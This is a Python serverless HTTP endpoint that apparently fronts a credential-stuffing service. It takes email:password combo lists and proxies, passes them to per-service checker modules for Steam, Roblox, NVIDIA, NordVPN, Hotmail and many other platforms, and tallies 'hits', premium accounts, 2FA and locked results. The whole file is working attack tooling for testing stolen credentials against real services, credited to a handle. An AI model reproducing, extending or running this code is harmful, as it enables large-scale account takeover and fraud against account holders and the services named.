from http.server import BaseHTTPRequestHandler
import json
import os
import sys
import traceback
import re

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "checkers_ext"))

COMBO_RX = re.compile(
    r"([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):([^\s|,;>\"']+)"
)


def extract_one(raw: str):
    raw = (raw or "").strip()
    m = COMBO_RX.search(raw)
    if m:
        return m.group(1).lower(), m.group(2)
    if ":" in raw:
        a, b = raw.split(":", 1)
        return a.strip().lower(), b.strip().split()[0]
    return None, None


# Map frontend id -> (module file stem, preferred entry names)
MODULE_MAP = {
    "nvidia": ("nvidia_by_eyelifter", ["eyelifter_check", "check"]),
    "duolingo": ("duolingo_by_eyelifter", ["eyelifter_check", "check"]),
    "lovable": ("lovable_by_eyelifter", ["check_account", "check"]),
    "rewards": ("rewards_by_eyelifter", ["check_combo", "check"]),
    "terabox": ("terabox_by_eyelifter", ["eyelifter_check", "check"]),
    "aha": ("aha_by_eyelifter", ["eyelifter_check", "check"]),
    "pixverse": ("pixverse_by_eyelifter", ["eyelifter_check", "check"]),
    "melbet": ("melbet_by_eyelifter", ["eyelifter_check_account", "check"]),
    "rdphostings": ("rdphostings_by_eyelifter", ["eyelifter_check", "check"]),
    "hotmail": ("hotmail_inbox_by_eyelifter", ["eyelifter_check", "check"]),
    "nordvpn": ("nordvpn_checker", ["check", "eyelifter_check"]),
    "cyberghost": ("cyberghost_checker", ["check", "eyelifter_check"]),
    "steam": ("steam_checker", ["check", "eyelifter_check"]),
    "roblox": ("roblox_checker", ["check", "eyelifter_check"]),
    "hidive": ("hidive_checker", ["check", "eyelifter_check"]),
    "exxen": ("exxen_checker", ["check", "eyelifter_check"]),
    "bilibili": ("bilibili_checker", ["check", "eyelifter_check"]),
    "vidio": ("vidio_checker", ["check", "eyelifter_check"]),
    "hma": ("hma_checker", ["check", "eyelifter_check"]),
}


def try_run(checker_id, email, password, proxy=None):
    info = MODULE_MAP.get(checker_id)
    if not info:
        return {
            "kind": "error",
            "line": f"{email}:{password} | checker '{checker_id}' not wired on serverless",
            "platform": checker_id,
        }
    mod_name, entries = info
    try:
        mod = __import__(mod_name)
    except Exception as e:
        return {
            "kind": "error",
            "line": f"{email}:{password} | import {mod_name}: {type(e).__name__}: {e}",
            "platform": checker_id,
        }
    fn = None
    for name in entries:
        fn = getattr(mod, name, None)
        if callable(fn):
            break
    if not callable(fn):
        # try class *.Checker().check
        for attr in dir(mod):
            if attr.endswith("Checker"):
                try:
                    inst = getattr(mod, attr)()
                    if hasattr(inst, "check"):
                        fn = inst.check
                        break
                except Exception:
                    pass
    if not callable(fn):
        return {
            "kind": "error",
            "line": f"{email}:{password} | no entry in {mod_name}",
            "platform": checker_id,
        }
    try:
        # try common signatures
        try:
            out = fn(f"{email}:{password}", proxy)
        except TypeError:
            try:
                out = fn(email, password, proxy)
            except TypeError:
                out = fn(email, password)
    except Exception as e:
        return {
            "kind": "error",
            "line": f"{email}:{password} | {type(e).__name__}: {str(e)[:120]}",
            "platform": checker_id,
        }

    # normalize
    if isinstance(out, tuple) and len(out) >= 2:
        kind, line = out[0], out[1]
        return {"kind": str(kind), "line": str(line), "platform": checker_id}
    if isinstance(out, dict):
        st = (out.get("status") or out.get("kind") or "error").lower()
        if st in ("ok", "hit", "gfn", "premium", "vip", "paid", "staff"):
            kind = "hit"
        elif st in ("free", "none"):
            kind = "free"
        elif st in ("bad", "invalid"):
            kind = "bad"
        elif st in ("2fa", "mfa", "locked"):
            kind = st
        else:
            kind = "error"
        line = out.get("line") or out.get("capture") or f"{email}:{password} | {st} | {out}"
        return {"kind": kind, "line": str(line)[:2000], "platform": checker_id, "raw": out}
    return {"kind": "error", "line": f"{email}:{password} | unknown result type", "platform": checker_id}


class handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(length).decode("utf-8", errors="replace") if length else "{}"
            data = json.loads(raw or "{}")
        except Exception:
            data = {}

        checker = (data.get("checker") or data.get("id") or "").strip().lower()
        combo = data.get("combo") or data.get("email_pass") or ""
        proxy = data.get("proxy") or None
        combos = data.get("combos")  # optional list

        results = []
        if isinstance(combos, list) and combos:
            # hard limit for serverless timeout
            for c in combos[:15]:
                email, pw = extract_one(str(c))
                if not email:
                    results.append({"kind": "error", "line": f"{c} | invalid", "platform": checker})
                    continue
                results.append(try_run(checker, email, pw, proxy))
        else:
            email, pw = extract_one(str(combo))
            if not email:
                body = json.dumps({"ok": False, "error": "invalid combo"}).encode()
                self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self._cors()
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            results.append(try_run(checker, email, pw, proxy))

        hits = sum(1 for r in results if r.get("kind") == "hit")
        free = sum(1 for r in results if r.get("kind") == "free")
        bad = sum(1 for r in results if r.get("kind") == "bad")
        errors = sum(1 for r in results if r.get("kind") not in ("hit", "free", "bad", "2fa", "mfa", "locked"))

        payload = {
            "ok": True,
            "checker": checker,
            "checked": len(results),
            "hits": hits,
            "free": free,
            "bad": bad,
            "errors": errors,
            "results": results,
            "by": "@samvir1",
        }
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        body = json.dumps({"ok": True, "usage": "POST {checker, combo|combos, proxy?}"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
